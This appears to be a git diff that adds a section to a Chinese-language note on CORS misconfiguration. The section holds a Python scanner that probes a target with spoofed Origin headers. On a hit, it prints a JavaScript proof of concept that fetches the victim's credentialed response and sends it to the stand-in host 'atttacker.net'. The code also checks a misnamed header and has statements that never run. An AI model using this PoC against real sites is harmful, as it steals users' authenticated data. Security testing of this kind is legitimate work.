@@ -116,3 +116,80 @@ if __name__ == "__main__":
     CheckCORS(url)
     
 ```
+
+## 2023.05.19 补充
+
+### Access-Allow-Control-Origin 头
+
+> Access-Allow-Control-Origin 用于针对没有凭据的请求，这大致表明:虽然接受跨域请求，但用户未认证
+
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin
+
+一般有以下几种回显:
+
+```
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Origin: <origin>
+Access-Control-Allow-Origin: null
+```
+
+补充代码:
+
+```python
+#python3
+import requests
+import re
+import sys
+
+if len(sys.argv) < 2:
+    print("requires a url parameter.")
+    sys.exit(0)
+else:
+    url = sys.argv[1]
+
+def CheckCORS(url):
+    domain = re.search(r"https?://([\w.-]+)/", url)
+    domain = domain.group(1)
+    payload = ['https://'+domain+'.test.com','http://'+domain+'.test.com','https://'+domain+' .test.com','https://'+domain+'_.test.com','null','https://www.test.com','http://www.test.com']
+    POC = """
+	var req = new XMLHttpRequest();  
+	req.onload = reqListener;  
+	req.open('get','"""+url+"""',true);  
+	req.withCredentials = true;  
+	req.send();  
+  
+	function reqListener() {  
+	    location='//atttacker.net/log?key='+this.responseText;  
+	};
+	"""
+    for i in range(len(payload)):
+        try:
+            headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
+            "Origin": payload[i]
+            }
+            aaco_headers = acao_headers = acac_headers = ""
+            response = requests.get(url,headers=headers)
+            if 'Access-Control-Allow-Origin' in response.headers:
+                 acao_headers = response.headers['Access-Control-Allow-Origin']
+            if 'Access-Control-Allow-Credentials' in response.headers:
+                acac_headers = response.headers['Access-Control-Allow-Credentials']
+            if 'Access-Allow-Control-Origin' in response.headers:
+                aaco_headers = response.headers['Access-Allow-Control-Origin']
+            if (acao_headers == payload[i] or acao_headers == '*') and acac_headers == "true":
+                print("{} has a CORS vulnerability.".format(url))
+                print("try to use poc:\n {}".format(POC))
+                print("change hosts file to: 127.0.0.1  {}\nand put POC HTML file in HTTP Server.".format(payload[i]))
+                break
+                return url
+            elif  (aaco_headers == payload[i] or aaco_headers == '*') or acac_headers == "true":
+                print("{} Maybe has a CORS vulnerability. but need check manual".format(url))
+                return url
+                break
+        except:
+            pass
+
+if __name__ == "__main__":
+    CheckCORS(url)
+    
+```
